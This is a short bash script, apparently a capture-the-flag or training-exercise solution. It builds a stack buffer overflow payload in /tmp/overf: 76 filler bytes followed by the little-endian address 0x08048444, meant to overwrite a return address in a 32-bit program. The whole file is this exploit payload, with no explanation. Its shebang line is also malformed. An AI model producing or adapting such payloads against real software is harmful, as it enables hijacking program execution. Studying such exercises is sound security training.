#!bin/bash
for i in `seq 1 76`;
do
	echo -n "x" >> /tmp/overf
done
printf "\x44\x84\x04\x08\n" >> /tmp/overf